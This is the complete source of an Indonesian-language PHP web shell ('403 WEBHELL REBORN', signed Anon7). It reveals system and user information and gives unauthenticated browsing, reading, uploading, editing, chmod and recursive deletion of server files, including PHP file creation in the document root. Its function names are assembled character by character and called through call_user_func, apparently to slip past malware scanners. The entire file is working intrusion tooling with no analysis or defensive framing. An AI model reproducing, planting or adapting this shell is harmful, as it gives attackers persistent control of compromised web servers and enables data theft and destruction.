<!DOCTYPE html>
<html>
<head>
    <title>403 WEBHELL REBORN</title>
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

#content tr:hover {
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #25383C;
}

#content .first:hover {
    background-color: #25383C
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 1px #000000 dotted;
    table-layout: fixed;
}

td {
    word-wrap: break-word;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: #000000;
    text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
    border: 1px #000000 solid;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
    padding:3px;
    margin:1px;
    font-size: 13px;
    color: #ffffff;
    background-color: transparent;
    text-shadow:0px 0px 10px #ffffff;
    text-decoration: none;
}

.gas {
    background-color: transparent;
    color: #ffffff;
    border: 1px #ffffff dotted;
    font-family: "Dosis", cursive;
    font-size: 13px;
    text-decoration: none;
}

.up {
    background-color: transparent;
    color: #ffffff;
    font-family: "Dosis", cursive;
    font-size: 13px;
    text-decoration: none;
}

.dir {
    color: #ffffff;
    border: 1px #000000 dotted;
    font-family: "Dosis", cursive;
    font-size: 13px;
    text-decoration: none;
}
</style>

<?php
// Helper function for obfuscated string creation
function obf($str) {
    return implode('.', array_map(function($c) { return "'".$c."'"; }, str_split($str)));
}

session_start();
error_reporting(0);
set_time_limit(0);

echo "<table width='700' border='0' cellpadding='3' cellspacing='1' align='center'>";
echo "<tr><td>";
echo "<font size='5' family='Bungee'><b>WEX00</b></font>";
echo "</td></tr>";
echo "<tr><td>";

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='gold'>NONE</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<center><br>Anon7 - 2021</center>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = call_user_func('g'.'e'.'t'.'c'.'w'.'d');
    }
    if (call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', $lokasi)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function cekroot() {
    if (call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', $_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrmdir($dir) {
    $items = call_user_func('s'.'c'.'a'.'n'.'d'.'i'.'r', $dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (call_user_func('i'.'s'.'_'.'d'.'i'.'r', $path)) {
            xrmdir($path);
        } else {
            call_user_func('u'.'n'.'l'.'i'.'n'.'k', $path);
        }
    }
    call_user_func('r'.'m'.'d'.'i'.'r', $dir);
}

function green($text) {
    echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".call_user_func('p'.'h'.'p'.'_'.'u'.'n'.'a'.'m'.'e')."</font><br>";
echo "User : <font color='gold'>".@call_user_func('g'.'e'.'t'.'_'.'c'.'u'.'r'.'r'.'e'.'n'.'t'.'_'.'u'.'s'.'e'.'r')."&nbsp;</font>( <font color='gold'>".@call_user_func('g'.'e'.'t'.'m'.'y'.'u'.'i'.'d')."</font>)<br>";
echo "PHP Version : <font color='gold'>".@call_user_func('p'.'h'.'p'.'v'.'e'.'r'.'s'.'i'.'o'.'n')."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "Directory : &nbsp;";

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = call_user_func('g'.'e'.'t'.'c'.'w'.'d');
    $lokdua = call_user_func('g'.'e'.'t'.'c'.'w'.'d');
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @call_user_func('s'.'c'.'a'.'n'.'d'.'i'.'r', $lokasi);

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$lokasis[$i]";
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
    if (isset($_POST['berkasnya'])) {
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @call_user_func('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $lokasi."/".$_FILES['berkas']['name'], @call_user_func('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $_FILES['berkas']['tmp_name']));
        if (call_user_func('f'.'i'.'l'.'e'.'_'.'e'.'x'.'i'.'s'.'t'.'s', $lokasi."/".$_FILES['berkas']['name'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
        } else {
            echo "<font color='red'>Failed to Upload !<br><br>";
        }
    }
}

if (isset($_POST['buatfolder']) && !empty($_POST['namafolder'])) {
    $target_folder = $lokasi . "/" . basename($_POST['namafolder']);
    if (!call_user_func('f'.'i'.'l'.'e'.'_'.'e'.'x'.'i'.'s'.'t'.'s', $target_folder)) {
        if (@call_user_func('m'.'k'.'d'.'i'.'r', $target_folder, 0755)) {
            echo "<font color='gold'>Folder <b>" . htmlspecialchars($_POST['namafolder']) . "</b> berhasil dibuat!</font><br><br>";
        } else {
            echo "<font color='red'>Gagal membuat folder!</font><br><br>";
        }
    } else {
        echo "<font color='red'>Folder sudah ada!</font><br><br>";
    }
}

// Membuat File Baru
if (isset($_POST['buatfile']) && !empty($_POST['namafile']) && !empty($_POST['extfile'])) {
    $filename = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['namafile']); // Hindari karakter aneh
    $ext = ($_POST['extfile'] == 'php') ? '.php' : '.html';
    $target_file = $lokasi . "/" . $filename . $ext;
    if (!call_user_func('f'.'i'.'l'.'e'.'_'.'e'.'x'.'i'.'s'.'t'.'s', $target_file)) {
        $default_content = ($ext == '.php') ? "<?php\n// File baru\n?>" : "<!-- File baru -->";
        if (@call_user_func('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $target_file, $default_content)) {
            echo "<font color='gold'>File <b>" . htmlspecialchars($filename . $ext) . "</b> berhasil dibuat!</font><br><br>";
        } else {
            echo "<font color='red'>Gagal membuat file!</font><br><br>";
        }
    } else {
        echo "<font color='red'>File sudah ada!</font><br><br>";
    }
}
// ==== Tambahan Fitur Baru Selesai ====

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
<br><b>Buat Folder Baru:</b>
<input type="text" name="namafolder" class="up" placeholder="Nama Folder">
<input type="submit" name="buatfolder" class="up" value="Buat Folder" style="cursor: pointer; border-color: #fff">
<!-- Fitur Membuat File Baru -->
<br><b>Buat File Baru:</b>
<input type="text" name="namafile" class="up" placeholder="nama_file">
<select name="extfile" class="up">
  <option value="php">.php</option>
  <option value="html">.html</option>
</select>
<input type="submit" name="buatfile" class="up" value="Buat File" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(call_user_func('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (call_user_func('i'.'s'.'_'.'d'.'i'.'r', $_POST['path'])) {
        xrmdir($_POST['path']);
        if (call_user_func('f'.'i'.'l'.'e'.'_'.'e'.'x'.'i'.'s'.'t'.'s', $_POST['path'])) {
            red("Failed to delete Directory !");
        } else {
            green("Delete Directory Success !");
            echo "string";
        }
    } elseif (call_user_func('i'.'s'.'_'.'f'.'i'.'l'.'e', $_POST['path'])) {
        @call_user_func('u'.'n'.'l'.'i'.'n'.'k', $_POST['path']);
        if (call_user_func('f'.'i'.'l'.'e'.'_'.'e'.'x'.'i'.'s'.'t'.'s', $_POST['path'])) {
            red("Failed to Delete File !");
        } else {
            green("Delete File Success !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', call_user_func('f'.'i'.'l'.'e'.'p'.'e'.'r'.'m'.'s', $_POST['path'])), -4).'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="ubahmod">
    <input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
    if (isset($_POST['chm0d'])) {
        $cm = @call_user_func('c'.'h'.'m'.'o'.'d', $_POST['path'], $_POST['perm']);
        if ($cm == true) {
            green("Change Mod Success !");
        } else {
            red("Change Mod Failed !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @call_user_func('r'.'e'.'n'.'a'.'m'.'e', $_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("Change Name Success !");
        } else {
            red("Change Name Failed !");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @call_user_func('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("Edit File Success !");
        } else {
            red("Edit File Failed !");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(call_user_func('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" />
    </form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
    if(!call_user_func('i'.'s'.'_'.'d'.'i'.'r', $lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
    echo "<tr>
    <td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center>";
    if(call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', $lokasi."/".$dir)) echo '<font color="green">';
    elseif(!call_user_func('i'.'s'.'_'.'r'.'e'.'a'.'d'.'a'.'b'.'l'.'e', $lokasi."/".$dir)) echo '<font color="red">';
    echo statusnya($lokasi."/".$dir);
    if(call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', $lokasi."/".$dir) || !call_user_func('i'.'s'.'_'.'r'.'e'.'a'.'d'.'a'.'b'.'l'.'e', $lokasi."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
    <select name=\"pilih\">
    <option value=\"\"></option>
    <option value=\"hapus\">Delete</option>
    <option value=\"ubahmod\">Chm0d</option>
    <option value=\"gantinama\">Rename</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
    <input type=\"submit\" class=\"gas\" value=\">\" />
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
    if(!call_user_func('i'.'s'.'_'.'f'.'i'.'l'.'e', "$lokasi/$file")) continue;
    $size = call_user_func('f'.'i'.'l'.'e'.'s'.'i'.'z'.'e', "$lokasi/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', "$lokasi/$file")) echo '<font color="green">';
elseif(!call_user_func('i'.'s'.'_'.'r'.'e'.'a'.'d'.'a'.'b'.'l'.'e', "$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(call_user_func('i'.'s'.'_'.'w'.'r'.'i'.'t'.'a'.'b'.'l'.'e', "$lokasi/$file") || !call_user_func('i'.'s'.'_'.'r'.'e'.'a'.'d'.'a'.'b'.'l'.'e', "$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$statusnya = call_user_func('f'.'i'.'l'.'e'.'p'.'e'.'r'.'m'.'s', $file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>